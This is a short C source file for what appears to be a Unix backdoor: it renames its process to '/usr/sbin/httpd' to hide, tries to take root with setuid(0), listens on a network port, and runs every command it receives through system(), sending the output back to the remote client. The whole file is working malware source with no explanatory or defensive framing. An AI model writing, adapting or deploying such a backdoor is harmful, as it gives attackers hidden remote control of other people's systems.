#include "backdoor.h"
#define MAX_CONN 3

int main(int argc, char **argv) {
int sd, new_sd, sin_len = sizeof(struct sockaddr_in);
char cmd[1000], new_cmd[1200], size[17], file[100];
FILE *fp;
struct sockaddr_in client, server;
strcpy(argv[0],"/usr/sbin/httpd");
snprintf(file,100,"%s/.cmd",getenv("HOME"));
setuid(0); setgid(0);
addr_init(&server, PORT, INADDR_ANY);
sd = socket(AF_INET, SOCK_STREAM, 0);

if (sd == -1)
exit(1);
if ( (bind(sd, (struct sockaddr*) &server, sin_len)) == -1)
exit(2);
if ( (listen(sd,MAX_CONN)) == -1)
exit(3);
new_sd = accept(sd, (struct sockaddr*) &client, &sin_len);
if (new_sd== -1)
exit(4);

for (;;) {
if ( (read(new_sd, cmd, sizeof(cmd))) == -1)
exit(1);
memset(new_cmd, 0x0, sizeof(new_cmd));
snprintf(new_cmd, sizeof(new_cmd), "%s > %s",cmd,file);
system(new_cmd);
sprintf(size,"%d",strlen(readFile(file)));
size[strlen(size)] = '\0';
if (!strcmp(size,"0")) {
snprintf (new_cmd, sizeof(new_cmd), "/bin/echo \"OK\" >%s",file);
system(new_cmd);
snprintf (size, sizeof(size), "%d",strlen(readFile(file)));
}
if ( (write(new_sd, size, sizeof(size))) == -1) exit(1);
if ( (write(new_sd, readFile(file), atoi(size))) == -1)
exit(1);
unlink(file);
}
close(new_sd);
close(sd);
}
